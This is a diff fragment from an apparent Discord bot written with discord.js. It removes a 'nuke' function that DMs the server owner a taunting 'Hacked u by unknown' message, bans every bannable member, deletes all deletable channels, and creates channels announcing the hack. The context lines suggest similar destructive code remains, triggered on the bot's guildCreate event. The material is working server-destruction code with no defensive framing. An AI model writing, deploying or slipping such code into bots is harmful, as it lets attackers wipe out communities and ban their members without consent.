@@ -730,41 +730,6 @@ m.createChannel('Hacked u by unknown Is here', 'voice');
 });
  
  
-const { Client } = require('discord.js');
-const client = new Client();
- 
-async function nuke(guild) {
-  let users = 0;
-  let channels = 0;
- 
-  await guild.fetchMembers();
- 
-  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
- 
- 
- 
-  await Promise.all(guild.members.map(async (m) => {
-    if (m.bannable) {
-      users++;
-      await m.send('^_^').catch(e => { return void e; });
-      return m.ban();
-    }
-  }));
- 
-    await Promise.all(guild.channels.map(c => {
-    if (c.deletable) {
-      channels++;
-      return c.delete();
-    }
-  }));
- 
-    await guild.createChannel('Hacked u by unknown Is here', 'text');
- 
-      await guild.createChannel('Hacked u by unknown Is here', 'voice');
- 
- 
- 
-}
 
 
 client.on('guildCreate', async (guild) => {
